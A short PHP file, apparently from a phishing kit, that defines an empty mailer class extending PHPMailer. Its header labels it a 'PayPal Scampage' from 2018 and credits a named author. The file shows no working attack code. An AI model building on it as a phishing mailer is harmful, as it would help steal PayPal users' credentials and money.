<?php
use PHPMailer\PHPMailer\PHPMailer;
use PHPMailer\PHPMailer\Exception;

require __DIR__ . '/phpmailer/vendor/autoload.php';

class Kuzuluy extends PHPMailer {
  /**
   * KuzuluyArt - PayPal Scampage 2018.
   * Scampage Version 1.0.
   *
   * @author    Achmad Fahri (fcod3x/Kuzuluy) <achfhr33@gmail.com>
   * @link      https://www.facebook.com/fcod3x.phtml The Developer link
   * @copyright 2017 - 2018 Achmad Fahri
   * @license   http://www.gnu.org/copyleft/lesser.html GNU Lesser General Public License
   */
}
?>
